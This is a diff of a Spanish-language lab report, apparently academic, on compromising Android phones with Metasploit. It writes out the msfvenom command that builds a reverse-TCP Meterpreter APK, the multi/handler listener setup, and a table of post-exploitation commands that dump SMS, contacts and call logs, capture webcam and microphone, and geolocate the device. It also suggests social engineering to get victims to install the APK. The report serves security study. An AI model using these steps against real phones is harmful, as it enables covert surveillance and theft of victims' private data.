@@ -39,13 +39,13 @@ Los pasos que se van a seguir se los pueden reunir en 2 grupos: la generación d
 El archivo que se genera, es un instalador de una aplicación Android (lleva la extensión .apk), el cual actúa como un exploit con el objetivo de tener acceso a información privada del sistema víctima. Ésto se logra cuando se activa el exploit, se puede obtener información privada con la ejecución de comandos, como acceder al filesystem o acceder al log de llamadas hechas con el celular. Cuando se ejecuta el exploit desde el smartphone víctima, queda corriendo en segundo plano a la espera de órdenes de un host controlado por el atacante.
 
 CONSOLA 1
-// En una consola y en modo superusuario se deben ejecutar los siguientes comandos:
+// En una consola y en modo superusuario se deben ejecutar los siguientes comandos (uno a la vez):
 # ifconfig
 // Este comando retorna varios parámetros agrupados por interfase de red. En el grupo relativo a la conexión inalámbrica (wlan0), se obtiene la IP de la máquina actual (con el formato X.X.X.X) el cual nos sirve como parámetro para el próximo comando:
 # msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8080 R > exploit.apk
 
 CONSOLA 2
-// En otra consola y en modo superusuario se deben ejecutar los siguientes comandos:
+// En otra consola y en modo superusuario se deben ejecutar los siguientes comandos (uno a la vez):
 msfconsole
 use multi/handler
 set payload android/meterpreter/reverse_tcp
@@ -64,79 +64,38 @@ Se logró conectar y activar la línea de comandos interna al smartphone (la cua
 
 En base a esta demostración, se obtuvieron las siguientes conclusiones. Una de ellas, es que se puede generar fácilmente un exploit que obtenga acceso a un smartphone, sin el consentimiento del usuario. Otra conclusión es que esta técnica se puede mejorar con la ayuda de la ingeniería social, de forma tal que se pueda inducir a un usuario (víctima) a instalar el exploit en su celular, haciéndole creer que es un software benigno. Cabe aclarar que esta prueba se aplica específicamente a la plataforma Android.
 
-Estos son los comandos que se probaron en los celulares (obtenidos a partir del comando "help"):
+Estos son los comandos relevantes que se probaron una vez dentro de alguno de los 3 smartphones (obtenidos a partir del comando "help"):
 
-Stdapi: File system Commands
-============================
+Comando		Descripción 													
+cat 		Lee el contenido de un archivo y lo muestra en la pantalla
+cd 			Cambia el directorio
+download 	Descarga un archivo
+edit 		Edita un archivo con el editor Vim
+lcd 		Cambia el directorio local de trabajo
+lpwd		Muestra el directorio local de trabajo
+ls 			Genera una lista de los archivos
+mkdir		Crea un directorio
+pwd 		Muestra el directorio de trabajo
+rm 			Borra un archivo específico
+rmdir 		Borra un directorio específico
+search 		Busca archivos
+upload 		Sube un archivo o un directorio
+ifconfig	Muestra las interfases de red
+route 		Muestra la tabla de rutado
+sysinfo		Devuelve información del sistem perteneciente al smartphone 
+record_mic	Graba un audio por un tiempo definido
+webcam_list	Muestra la lista de las cámaras
+webcam_snap	Toma una foto con una cámara
+webcam_stream	Muestra un video en tiempo real de lo que se ve por una cámara
+check_root	Comprueba si al dispositivo se aplicó rooting
+dump_calllog	Descarga en un archivo el registro de llamadas
+dump_contacts	Descarga en un archivo todos los contactos
+dump_sms		Descarga en un archivo todos los SMS
+geolocate		Obtiene la ubicación geográfica actual
 
-    Command       Description
-    -------       -----------
-    cat           Read the contents of a file to the screen
-    cd            Change directory
-    download      Download a file or directory
-    edit          Edit a file
-    getlwd        Print local working directory
-    getwd         Print working directory
-    lcd           Change local working directory
-    lpwd          Print local working directory
-    ls            List files
-    mkdir         Make directory
-    pwd           Print working directory
-    rm            Delete the specified file
-    rmdir         Remove directory
-    search        Search for files
-    upload        Upload a file or directory
-
-
-Stdapi: Networking Commands
-===========================
-
-    Command       Description
-    -------       -----------
-    ifconfig      Display interfaces
-    ipconfig      Display interfaces
-    portfwd       Forward a local port to a remote service
-    route         View and modify the routing table
-
-
-Stdapi: System Commands --- NO SON IMPORTANTES
-=======================
-
-    Command       Description
-    -------       -----------
-    execute       Execute a command
-    getuid        Get the user that the server is running as
-    ps            List running processes
-    shell         Drop into a system command shell
-    sysinfo       Gets information about the remote system, such as OS
-
-
-Stdapi: Webcam Commands
-=======================
-
-    Command        Description
-    -------        -----------
-    record_mic     Record audio from the default microphone for X seconds
-    webcam_chat    Start a video chat
-    webcam_list    List webcams
-    webcam_snap    Take a snapshot from the specified webcam
-    webcam_stream  Play a video stream from the specified webcam
-
-
-Android Commands
-================
-
-    Command        Description
-    -------        -----------
-    check_root     Check if device is rooted
-    dump_calllog   Get call log
-    dump_contacts  Get contacts list
-    dump_sms       Get sms messages
-    geolocate      Get current lat-long using geolocation
-
-Algunos comandos funcionaron con el path por defecto; en caso de que se ingrese un path determinado, el comando no funcionaba.
-Algunos comandos devolvían errores luego de una espera como el siguiente, ésto sucedía luego de una sesión con una duración larga (mayor a 5 minutos):
+Durante la prueba, sucedieron 2 situaciones anómalas. Por un lado, a veces la sesión de la shell conectada al smartphone se cerraba sola luego de pasado un tiempo. Por otro lado, en la ejecución de algunos comandos, después de haber hecho una espera de 20 segundos aproximadamente, se recibía este mensaje de error:
 [-] Error running command webcam_snap: Rex::TimeoutError Operation timed out.
+
 
 4.3.2 Segunda prueba
 
